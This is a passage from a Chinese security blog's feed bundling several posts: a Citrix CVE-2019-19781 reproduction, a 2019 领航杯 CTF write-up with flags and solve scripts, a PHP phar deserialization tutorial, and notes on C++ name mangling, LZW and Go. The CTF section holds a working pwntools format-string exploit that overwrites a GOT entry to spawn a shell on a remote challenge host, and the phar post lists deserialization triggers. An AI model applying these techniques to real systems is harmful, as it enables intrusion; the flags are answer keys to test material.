successful"></p></li><li><p>开启Xdebug Helper</p><p><img src="/images/pasted-219.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>刷新网页，phpstorm会提示以下内容，同意即可：</p><p><img src="/images/pasted-220.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>提示Debug session was finished without being paused</p><p>需要设置断点，然后刷新网页，就会显示如下界面。</p><p><img src="/images/pasted-221.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php调试环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-19781:Citrix路径遍历复现</title>
    <link href="/CVE-2019-19781-Citrix%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%A4%8D%E7%8E%B0.html"/>
    <url>/CVE-2019-19781-Citrix%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%A4%8D%E7%8E%B0.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>下班刚到家，发现了某平台的漏洞提示，然后就趁热复现了一波</p></blockquote><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote><p>twitter上的一位大佬公布的poc</p></blockquote><p><img src="/images/pasted-205.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>NetScaler Gateway</p></blockquote><p><img src="/images/pasted-206.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>Citrix Gateway</p></blockquote><p><img src="/images/pasted-207.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>修复后的效果(官方修复建议:<a href="https://support.citrix.com/article/CTX267679" target="_blank" rel="noopener">https://support.citrix.com/article/CTX267679</a>)</p></blockquote><p><img src="/images/pasted-208.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><blockquote><p>利用的复杂度不是很大。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2019-19781</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019领航杯WP</title>
    <link href="/2019%E9%A2%86%E8%88%AA%E6%9D%AFWP.html"/>
    <url>/2019%E9%A2%86%E8%88%AA%E6%9D%AFWP.html</url>
    
    <content type="html"><![CDATA[<h2 id="1-编码编码"><a href="#1-编码编码" class="headerlink" title="1.编码编码"></a>1.编码编码</h2><p>base64解码即可得到flag!</p><p><img src="/images/pasted-183.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:welcometothepilotcup</p><h2 id="2-取证分析"><a href="#2-取证分析" class="headerlink" title="2.取证分析"></a>2.取证分析</h2><p><img src="/images/pasted-184.png" srcset="/img/loading.gif" alt="upload successful"></p><p>利用脚本得到flag.png，用winhex删除开头多余数据，png文件头为89 50 开头</p><p><img src="/images/pasted-185.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结尾是AE 42 60 82</p><p>去除掉无用信息，得到flag，<strong>b91011fc</strong></p><h2 id="3-stegano-l"><a href="#3-stegano-l" class="headerlink" title="3.stegano l"></a>3.stegano l</h2><p>打开查看源码，得到flag就是passwd：后面字符 steganoI</p><p><img src="/images/pasted-186.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:steganol</p><h2 id="4-stegano"><a href="#4-stegano" class="headerlink" title="4.stegano"></a>4.stegano</h2><p>binwalk查看文件</p><p><img src="/images/pasted-187.png" srcset="/img/loading.gif" alt="upload successful"></p><p>foremost分离文件</p><p><img src="/images/pasted-188.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到flag</p><p><img src="/images/pasted-189.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:EORDFFOMFPMA</p><h2 id="5-lsb"><a href="#5-lsb" class="headerlink" title="5.lsb"></a>5.lsb</h2><p>用StegSolve打开图片，调制Red pane 3 即可得到flag</p><p><img src="/images/pasted-190.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:ONPGRAMBCICM</p><h2 id="6-恢复与解密"><a href="#6-恢复与解密" class="headerlink" title="6.恢复与解密"></a>6.恢复与解密</h2><p>下载附件,将其中的xty.img使用Diskgenius打开.</p><p>选择恢复文件</p><p><img src="/images/pasted-191.png" srcset="/img/loading.gif" alt="upload successful"></p><p>打开其中的INode00000010,可以看到密文 aWdxNDs3NDFSOzFpa1I1MWliT08waWdx</p><p>使用脚本对密文进行解密</p><pre><code class="python">import stringfrom base64 import *b=b64decode(&quot;aWdxNDs3NDFSOzFpa1I1MWliT08waWdx&quot;)data=list(b)for k in range(0,200):    key=&quot;&quot;    for i in range(len(data)):        key+=chr(ord(data[i])^k)    print (key)</code></pre><p>结果中没有特殊符号的则是flag</p><p>flag:jdr78472Q82jhQ62jaLL3jdr</p><h2 id="7-文件提取"><a href="#7-文件提取" class="headerlink" title="7.文件提取"></a>7.文件提取</h2><p>下载附件,使用记事本打开flag.exe.将其中的base64编码转换成图片</p><p><img src="/images/pasted-192.png" srcset="/img/loading.gif" alt="upload successful"></p><p>用记事本打开图片,可以在图片的最后看到flag</p><p>flag{068EEF6A7BAD3FDF}</p><h2 id="8-凯撒1"><a href="#8-凯撒1" class="headerlink" title="8.凯撒1"></a>8.凯撒1</h2><p>使用凯撒密码转换密文.</p><p><img src="/images/pasted-193.png" srcset="/img/loading.gif" alt="upload successful"></p><p>最后一个单词是flag</p><p>flag:moconlfpeold</p><h2 id="9-凯撒2"><a href="#9-凯撒2" class="headerlink" title="9.凯撒2"></a>9.凯撒2</h2><p>payload:</p><pre><code class="python">a = &quot;0B 33 33 28 20 2E 33 26 70 20 3D 33 39 20 37 33 30 3A 29 28 20 33 32 29 20 31 33 36 29 20 27 2C 25 30 30 29 32 2B 29 20 2D 32 20 3D 33 39 36 20 2E 33 39 36 32 29 3D 72 20 18 2C 2D 37 20 33 32 29 20 3B 25 37 20 2A 25 2D 36 30 3D 20 29 25 37 3D 20 38 33 20 27 36 25 27 2F 72 20 1B 25 37 32 6B 38 20 2D 38 03 20 75 76 7C 20 2F 29 3D 37 20 2D 37 20 25 20 35 39 2D 38 29 20 37 31 25 30 30 20 2F 29 3D 37 34 25 27 29 70 20 37 33 20 2D 38 20 37 2C 33 39 30 28 32 6B 38 20 2C 25 3A 29 20 38 25 2F 29 32 20 3D 33 39 20 38 33 33 20 30 33 32 2B 20 38 33 20 28 29 27 36 3D 34 38 20 38 2C 2D 37 20 31 29 37 37 25 2B 29 72 20 1B 29 30 30 20 28 33 32 29 70 20 3D 33 39 36 20 37 33 30 39 38 2D 33 32 20 2D 37 20 31 25 37 37 32 34 2A 33 25 37 26 37 72&quot;ls = []for i in a.split(&#39; &#39;):    ls.append(int(i, 16))print(ls)for i in range(-100, 100):    try:        for j in ls:            print(chr(j+i), end=&#39;&#39;)        print()    except:        pass</code></pre><p>得到flag如图中阴影</p><p><img src="/images/pasted-194.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="10-ascii"><a href="#10-ascii" class="headerlink" title="10.ascii"></a>10.ascii</h2><pre><code class="c">&gt;&gt;&gt; l=[84,104,101,32,115,111,108,117,116,105,111,110,32,105,115,58,32,105,104,98,100,115,105,101,111, 112,100,99,110]&gt;&gt;&gt; a=&#39;&#39;&gt;&gt;&gt; for i in l:...  a+=chr(i)...&gt;&gt;&gt; a&#39;The solution is: ihbdsieopdcn&#39;</code></pre><p>flag:ihbdsieopdcn</p><h2 id="11-forensics"><a href="#11-forensics" class="headerlink" title="11.forensics"></a>11.forensics</h2><p>binwalk查看文件</p><p><img src="/images/pasted-195.png" srcset="/img/loading.gif" alt="upload successful"></p><p>foremost分离文件</p><p>查看有用信息得到图片就是flag</p><p><img src="/images/pasted-196.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag:360HA360</p><h2 id="12-usb"><a href="#12-usb" class="headerlink" title="12.usb"></a>12.usb</h2><p>发现是usb协议的流量分析然后找到了罗技</p><p><img src="/images/pasted-197.png" srcset="/img/loading.gif" alt="upload successful"></p><p>然后我们查看数据发现代表着鼠标的移动，导出数据到a.txt</p><pre><code class="c">00: ff :00:0000: ff :00:0000: ff :00:0000: fd: 00: 0000: ff :00:0000: ff :00:0000: fe: ff :0000: fd: 00:0000: fb:00: 0000: fc :00:0000: fb:00:0000: fc :00:0000: fc: ff :0000: fe: 00: 0000:fe:ff:0000: fe:00:0000: ff :00: 0000: fe:ff :0000: ff: ff :0001 :00: 00:00</code></pre><p>然后我们转换坐标</p><p>awk -F: ‘function comp(v){if(v&gt;127)v-=256;return v}{x+=comp(strtonum(“0x”$2));y+=comp(strtonum(“0x”$3))}$1==”01”{print x,y}’ a.txt &gt; b.txt</p><p>得到坐标后用gnuplot画出flag即可</p><p>flag为tHe_CAT_is_the_CULpRiT</p><h2 id="14-MasterofZip-Middle"><a href="#14-MasterofZip-Middle" class="headerlink" title="14.MasterofZip-Middle"></a>14.MasterofZip-Middle</h2><p>爆破得到password!</p><p><img src="/images/pasted-198.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到伪加密的包用winhex修改为00</p><p>得到flag.png用winhex审计后发现高度不够</p><p>我们调整高度后最终得到flag</p><p><img src="/images/pasted-199.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{b2599e17dd7c48ae62d008a1a145cc6d9928d4ac}</p><h2 id="15-数据包分析-Easy"><a href="#15-数据包分析-Easy" class="headerlink" title="15.数据包分析-Easy"></a>15.数据包分析-Easy</h2><p>导出HTTP所有文件</p><p><img src="/images/pasted-200.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到flag.php，即flag</p><p>flag{3eyufhnj87}</p><h2 id="16-easyelf"><a href="#16-easyelf" class="headerlink" title="16.easyelf"></a>16.easyelf</h2><p>angr求解即可</p><p><img src="/images/pasted-201.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{Thunk_c0des_xoR_thr3e_de4l}</p><h2 id="22-giao"><a href="#22-giao" class="headerlink" title="22.giao"></a>22.giao</h2><p>payload:</p><p><img src="/images/pasted-202.png" srcset="/img/loading.gif" alt="upload successful"></p><p>即可得到flag{5f284498df}</p><h2 id="23-easy-fmt"><a href="#23-easy-fmt" class="headerlink" title="23.easy_fmt"></a>23.easy_fmt</h2><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./easy_fmt&#39;)e = ELF(&#39;./easy_fmt&#39;)libc=ELF(&quot;/libc64.so&quot;)p=remote(&quot;39.104.173.175&quot;,&quot;15502&quot;)get_libc_payload = &quot;%7$s&quot;.ljust(8, &#39;a&#39;)+p64(e.got[&#39;read&#39;])p.send(get_libc_payload)read_libc = u64(p.recv(6)+&#39;\x00\x00&#39;)print hex(read_libc)begin_libc = read_libc-libc.symbols[&#39;read&#39;]print hex(begin_libc)one_gadget_libc = begin_libc+libc.symbols[&#39;system&#39;]print hex(one_gadget_libc)a1 = (one_gadget_libc &amp; 0xff0000) &gt;&gt; 16a2 = (one_gadget_libc &amp; 0xff00) &gt;&gt; 8a3 = one_gadget_libc &amp; 0xffprint hex(a1)+hex(a2)+hex(a3)point1 = [2, a1]point2 = [1, a2]point3 = [0, a3]def swap(p1, p2):    for i in range(2):        t = p1[i]        p1[i] = p2[i]        p2[i] = tif a1 &gt; a2:    swap(point1, point2)if a1 &gt; a3:    swap(point1, point3)if a2 &gt; a3:    swap(point2, point3)print point1+point2+point3point2[1] = point2[1]-point1[1]point3[1] = point3[1]-point2[1]-point1[1]print point1+point2+point3write_got_payload = &#39;%&#39;+str(point1[1])+&#39;c&#39;+&#39;%12$hhn&#39;write_got_payload += &#39;%&#39;+str(point2[1])+&#39;c&#39;+&#39;%13$hhn&#39;write_got_payload += &#39;%&#39;+str(point3[1])+&#39;c&#39;+&#39;%14$hhn&#39;write_got_payload = write_got_payload.ljust(48, &#39;a&#39;)write_got_payload += p64(e.got[&#39;printf&#39;]+point1[0])write_got_payload += p64(e.got[&#39;printf&#39;]+point2[0])write_got_payload += p64(e.got[&#39;printf&#39;]+point3[0])p.send(write_got_payload)sleep(1)p.sendline(&quot;/bin/sh\x00&quot;)p.interactive()</code></pre><p>得到flag{279920429c}</p><h2 id="24-EasyRE"><a href="#24-EasyRE" class="headerlink" title="24.EasyRE"></a>24.EasyRE</h2><p><img src="/images/pasted-203.png" srcset="/img/loading.gif" alt="upload successful"></p><p>flag{Let_Us_st4rt_R3v3rSe}</p><h2 id="25-EASYReverse"><a href="#25-EASYReverse" class="headerlink" title="25.EASYReverse"></a>25.EASYReverse</h2><p>ida查看程序，发现是个没有查表的base64，遂用脚本分离出了前一部分</p><p><img src="/images/pasted-204.png" srcset="/img/loading.gif" alt="upload successful"></p><p>最后三个字节手动拼凑得到正确flag</p><p>flag{JSe3psfxa2X96USgM58346t4Ta87uRQy}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
    <url>/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞作用"><a href="#漏洞作用" class="headerlink" title="漏洞作用"></a>漏洞作用</h2><p><code>在不使用unserialize()函数的情况下触发PHP反序列化漏洞</code></p><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><p><code>使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Meta data 信息会被反序列化 如果要生成phar文件，要在php.ini中把phar只读给关闭</code></p><pre><code class="c">php.ini[Phar]phar.readonly = Off</code></pre><h2 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h2><pre><code class="c">&lt;?php$phar = new Phar(&#39;test.phar&#39;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); // add object of any class as meta dataclass AnyClass {}$object = new AnyClass;$object-&gt;data = &#39;rips&#39;;$phar-&gt;setMetadata($object);$phar-&gt;stopBuffering();</code></pre><pre><code class="c">php -c /Applications/XAMPP/xamppfiles/etc/php.ini phar.php //执行生成的文件如下</code></pre><p><img src="/images/pasted-181.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="c">&lt;?php// add object of any class as meta dataclass AnyClass {    function __destruct(){        echo $this-&gt;data;    }    function __sleep(){        echo &#39;sleep&#39;;    }   function __wakeup(){       echo &#39;wakeup&lt;br&gt;&#39;;   }}include(&#39;phar://test.phar&#39;); // 触发反序列化</code></pre><p><img src="/images/pasted-182.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="能够触发反序列化的函数有"><a href="#能够触发反序列化的函数有" class="headerlink" title="能够触发反序列化的函数有"></a>能够触发反序列化的函数有</h2><pre><code class="c">include(&#39;phar://test.phar&#39;);var_dump(file(&#39;phar://test.phar&#39;));var_dump(fopen(&#39;phar://test.phar&#39;,&#39;r&#39;));var_dump(file_get_contents(&#39;phar://test.phar&#39;));var_dump(file_get_contents(&#39;phar://test.jpg&#39;));(把文件名改成jpg也有效)var_dump(file_exists(&#39;phar://test.phar&#39;));file_exists($_GET[&#39;file&#39;]);md5_file($_GET[&#39;file&#39;]);filemtime($_GET[&#39;file&#39;]);filesize($_GET[&#39;file&#39;]);</code></pre><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="https://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg</a></p>]]></content>
    
    
    <categories>
      
      <category>学习研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phar反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++ 符号修饰和函数签名</title>
    <link href="/C-%E7%AC%A6%E5%8F%B7%E4%BF%AE%E9%A5%B0%E5%92%8C%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D.html"/>
    <url>/C-%E7%AC%A6%E5%8F%B7%E4%BF%AE%E9%A5%B0%E5%92%8C%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在开始的时候，源文件与目标文件的函数的符号名是相同的。后来UNIX平台和C语言发明时，已经存在很多汇编编写的库和目标文件，一个C程序要使用他们，就不能定义这些库中定义的函数和变量的名字作为符号，否则会产生冲突。为了防止类似的符号名冲突，UNIX下的C语言就规定，C语言源代码文件中的所有全局的变量和函数经过编译以后，相对应的符号名前加上下划线”<em>“。而Fortran语言的源代码经过编译以后，所有的符号名前加上”</em>“，后面也加上”_”。比如一个C语言函数”foo”，那么它编译后的符号名就是”_foo”；如果是Fortran语言，就是”<em>foo</em>“。 这种方法能够暂时减少多种语言目标文件之间的符号冲突的概率，但还是没有从根本上解决符号冲突的问题。比如同一种语言编写的目标文件还有可能会产生符号冲突，于是像C++这样的后来设计的语言开始考虑到了这个问题，增加了名称空间（Namespace）的方法来解决多模块的符号冲突问题。 在现在的Linux下的GCC编译器中，默认情况下已经去掉了在C语言符号前加”<em>“的这种方式；但是Windows平台下的编译器还保持的这样的传统，比如Visual C++编译器就会在C语言符号前加”</em>“，GCC在Windows平台下的版本（cygwin、mingw）也会加”_”。GCC编译器也可以通过参数选项”-fleading-underscore”或”-fno-leading-underscore”来打开和关闭是否在C语言符号前加上下划线。</p></blockquote><h2 id="符号修饰"><a href="#符号修饰" class="headerlink" title="符号修饰"></a>符号修饰</h2><pre><code class="c">int func(int);  float func(float);  class C {      int func(int);      class C2 {          int func(int);      };  };  namespace N {      int func(int);      class C {          int func(int);      };  } </code></pre><p><code>上面的6个函数签名在GCC编译器下，相对应的修饰后名称如下所示：</code></p><pre><code class="c">函数签名                       符号名int func(int)                  _Z4funcifloat func(float)              _Z4funcfint C::func(int)               _ZN1C4funcEiint C::C2::func(int)           _ZN1C2C24funcEiint N::func(int)               _ZN1N4funcEiint N::C::func(int)            _ZN1N1C4funcEi</code></pre><p><code>GCC的基本C++名称修饰方法如下</code></p><blockquote><p>所有的符号都以”_Z”开头，对于嵌套的名字（在名称空间或在类里面的），后面紧跟”N”，然后是各个名称空间和类的名字，每个名字前是名字字符串长度，再以”E”结尾。</p></blockquote><blockquote><p>比如N::C::func经过名称修饰以后就是_ZN1N1C4funcE。</p></blockquote><blockquote><p>对于一个函数来说，它的参数列表紧跟在”E”后面，对于int类型来说，就是字母”i”。</p></blockquote><blockquote><p>所以整个N::C::func(int)函数签名经过修饰为_ZN1N1C4funcEi。</p></blockquote><p><code>C++中的全局变量和静态变量也有同样的机制</code></p><blockquote><p>对于全局变量来说，它跟函数一样都是一个全局可见的名称，它也遵循上面的名称修饰机制，比如一个名称空间foo中的全局变量bar，它修饰后的名字为：_ZN3foo3barE。</p></blockquote><blockquote><p>变量的类型并没有被加入到修饰后名称中，所以不论这个变量是整形还是浮点型甚至是一个全局对象，它的名称都是一样的。</p></blockquote><blockquote><p>名称修饰机制也被用来防止静态变量的名字冲突。</p></blockquote><blockquote><p>比如 main() 函数里面有一个静态变量叫foo，而 func() 函数里面也有一个静态变量叫foo。</p></blockquote><blockquote><p>为了区分这两个变量，GCC会将它们的符号名分别修饰成两个不同的名字”_ZZ4mainE3foo”和”_ZZ4funcE3foo”.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++符号修饰</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LZW无损压缩算法</title>
    <link href="/LZW%E6%97%A0%E6%8D%9F%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95.html"/>
    <url>/LZW%E6%97%A0%E6%8D%9F%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>在看writeup的时候，题目含有base64和lzw算法，由于不了解lzw算法，遂学习一下。</p></blockquote><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>LZW就是通过建立一个字符串表，用较短的代码来表示较长的字符串来实现压缩。</p></blockquote><hr><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><blockquote><p>从原字符串不断地读入新的字符，并试图将单个字符或字符串编码为记号 (Symbol)。</p></blockquote><blockquote><p>维护两个变量，一个是P (Previous)，表示手头已有的，还没有被编码的字符串，一个是C (current)，表示当前新读进来的字符。</p></blockquote><ol><li>初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时P和C都是空的。</li><li>读入新的字符C，与P合并形成字符串P+C。</li><li><p>在字典里查找P+C，如果:</p><ol><li><p>P+C在字典里，P=P+C。</p></li><li><p>P+C不在字典里，将P的记号输出；在字典中为P+C建立一个记号映射；更新P=C。</p></li></ol></li><li><p>返回步骤2重复，直至读完原字符串中所有字符。</p></li></ol><blockquote><p>以上表示的是编码中间的一般过程，在收尾的时候有一些特殊的处理，即步骤2中，如果到达字符串尾部，没有新的C读入了，则将手头的P对应的记号输出，结束。</p></blockquote><blockquote><p>编码过程的核心就在于第3步，需要理解P究竟是什么。P是当前维护的，可以被编码为记号的子串。注意P是可以被编码为记号，但还并未输出。新的字符C不断被读入并添加到P的尾部，只要P+C仍然能在字典里找到，就不断增长更新P=P+C，这样就能将一个尽可能长的字串P编码为一个记号，这就是压缩的实现。当新的P+C无法在字典里找到时，我们没有办法，输出已有的P的编码记号，并为新子串P+C建立字典表项。然后新的P从单字符C开始，重新增长，重复上述过程。</p></blockquote><pre><code class="c">用一个例子来说明编码的过程ababcababac初始状态字典里有三个默认的映射：Symbol    String0         a1         b2         c开始编码：Step   P   C   P+C   P+C in Dict ？      Action               Output1      -   a    a        Yes             更新P=a               -2      a   b    ab       No              添加3-&gt;ab，更新P=b     03      b   a    ba       No              添加4-&gt;ba，更新P=a     14      a   b    ab       Yes             更新P=ab              -5      ab  c    abc      No              添加5-&gt;abc，更新P=c    36      c   a    ca       No              添加6-&gt;ca，更新P=a     27      a   b    ab       Yes             更新P=ab              -8      ab  a    aba      No              添加7-&gt;aba，更新P=a    39      a   b    ab       Yes             更新P=ab              -10     ab  a    aba      Yes             更新P=aba             -11     aba c    abac     No              添加8-&gt;abac，更新P=c   712     c   -    -        -               -                     2注意编码过程中的第3-4步，第7-8步以及8-10步，子串P发生了增长，直到新的P+C无法在字典中找到，则将当前的P输出，P则更新为单字符C，重新开始增长。输出的结果为0132372，完整的字典为：Symbol String0      a1      b2      c3      ab4      ba5      abc6      ca7      aba8      abac原字符串对应到压缩后的编码的0 1 3  2 3  7   2a b ab c ab aba c</code></pre><hr><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ol><li>初始状态，字典里只有所有的默认项，例如0-&gt;a，1-&gt;b，2-&gt;c。此时pW和cW都是空的。</li><li>读入第一个的符号cW，解码输出。注意第一个cW肯定是能直接解码的，而且一定是单个字符。</li><li>赋值pW=cW。</li><li>读入下一个符号cW。</li><li><p>在字典里查找cW，如果:</p><ol><li><p>cW在字典里：</p><ol><li>解码cW，即输出 Str(cW)。</li><li>令P=Str(pW)，C=Str(cW)的<strong>第一个字符</strong>。</li><li>在字典中为P+C添加新的记号映射。</li></ol></li><li><p>cW不在字典里:</p><ol><li>令P=Str(pW)，C=Str(pW)的<strong>第一个字符</strong>。</li><li>在字典中为P+C添加新的记号映射，这个新的记号一定就是cW。</li><li>输出P+C。</li></ol></li></ol></li><li>返回步骤3重复，直至读完所有记号。</li></ol><pre><code class="c">记号0 1 3  2 3  7   2解码a b ab c ab aba c初始状态字典里有三个默认的映射：Symbol    String0         a1         b2         cStep pW cW   cW in Dict ？   Action                             Output0    -  0       Yes          P=-,C=a,P+C=a                      a1    0  1       Yes          P=a，C=b，P+C=ab，添加3-&gt;ab          b2    1  3       Yes          P=b，C=a，P+C=ba，添加4-&gt;ba          ab3    3  2       Yes          P=ab，C=c，P+C=abc，添加5-&gt;abc       c4    2  3       Yes          P=c，C=a，P+C=ca，添加6-&gt;ca          ab5    3  7       No           P=ab，C=a，P+C=aba，添加7-&gt;aba       aba6    7  2       Yes          P=aba，C=c，P+C=abac，添加8-&gt;abac    c</code></pre><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><pre><code class="c">默认的映射表通常为255行，也就是ASCII码表的长度，拓展从256开始。加密：不断读取源数据，直到不在映射表里，输出P并添加一个新的映射解密：读取记号流，如果在映射表里，就输出并添加一个映射</code></pre><hr><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p><a href="https://segmentfault.com/a/1190000011425787" target="_blank" rel="noopener">LZW压缩算法</a></p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LZW压缩算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录遍历到递归</title>
    <link href="/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%88%B0%E9%80%92%E5%BD%92.html"/>
    <url>/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%88%B0%E9%80%92%E5%BD%92.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完，一直在坚持和学校一样的教学体系，每天的课程是不一样的，不会导致学习疲劳，三分热度，一直抱着一本书看下去，几天就失了兴趣，比如编译原理…</p></blockquote><blockquote><p>一步一jo印</p></blockquote><h3 id="中序"><a href="#中序" class="headerlink" title="中序"></a>中序</h3><blockquote><p>之前学习Java时，没有想到写一个遍历指定目录的程序，最近在学习Golang，想着用GO语言实现以下。</p></blockquote><blockquote><p>思路</p></blockquote><ol><li>指定需要遍历的目录</li><li>列出目录下的所有文件以及文件夹</li><li>打印文件名或文件夹名</li><li>判断是否为文件夹，是则去第1步，否则去第5步</li><li>退出</li></ol><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><blockquote><p>用递归的方式实现该程序</p></blockquote><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;io/ioutil&quot;)func main() {    listDir(&quot;/Users/bufsnake&quot;, 0)}func listDir(dir string, level int) {    s := &quot;&quot;    for i := 0; i &lt; level; i++ {        s = s + &quot;   &quot;    }    fileInfos, err := ioutil.ReadDir(dir)    if err != nil {        fmt.Println(err)    }    for _, file := range fileInfos {        fi := dir + &quot;/&quot; + file.Name()        fmt.Println(s + fi)        if file.IsDir() {            listDir(fi, level+1)        }    }}</code></pre><blockquote><p>运行结果</p></blockquote><pre><code class="bash">☁  golang  go run mulubianli.go/Users/bufsnake/golang/_   /Users/bufsnake/golang/_/main.go/Users/bufsnake/golang/array.go/Users/bufsnake/golang/bufio   /Users/bufsnake/golang/bufio/main.go/Users/bufsnake/golang/ch1   /Users/bufsnake/golang/ch1/dup1      /Users/bufsnake/golang/ch1/dup1/main.go   /Users/bufsnake/golang/ch1/dup2      /Users/bufsnake/golang/ch1/dup2/file      /Users/bufsnake/golang/ch1/dup2/main.go   /Users/bufsnake/golang/ch1/echo1      /Users/bufsnake/golang/ch1/echo1/main.go   /Users/bufsnake/golang/ch1/echo2      /Users/bufsnake/golang/ch1/echo2/main.go   /Users/bufsnake/golang/ch1/echo3      /Users/bufsnake/golang/ch1/echo3/main.go   /Users/bufsnake/golang/ch1/helloworld      /Users/bufsnake/golang/ch1/helloworld/README.md      /Users/bufsnake/golang/ch1/helloworld/main.go   /Users/bufsnake/golang/ch1/server1      /Users/bufsnake/golang/ch1/server1/mian.go/Users/bufsnake/golang/chabie   /Users/bufsnake/golang/chabie/chabie   /Users/bufsnake/golang/chabie/main.go/Users/bufsnake/golang/deferDemo.go/Users/bufsnake/golang/deferDemo1.go/Users/bufsnake/golang/exception.go/Users/bufsnake/golang/func.go/Users/bufsnake/golang/gob_msgpack.go/Users/bufsnake/golang/main.go/Users/bufsnake/golang/mapDemo.go/Users/bufsnake/golang/mulubianli.go/Users/bufsnake/golang/rand   /Users/bufsnake/golang/rand/main.go/Users/bufsnake/golang/strconv   /Users/bufsnake/golang/strconv/main.go/Users/bufsnake/golang/time   /Users/bufsnake/golang/time/main.go/Users/bufsnake/golang/web   /Users/bufsnake/golang/web/ch1      /Users/bufsnake/golang/web/ch1/login.gtpl      /Users/bufsnake/golang/web/ch1/main      /Users/bufsnake/golang/web/ch1/main.go   /Users/bufsnake/golang/web/ginDemo.go</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Go Go Golang</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sudo提权漏洞复现</title>
    <link href="/Sudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"/>
    <url>/Sudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html</url>
    
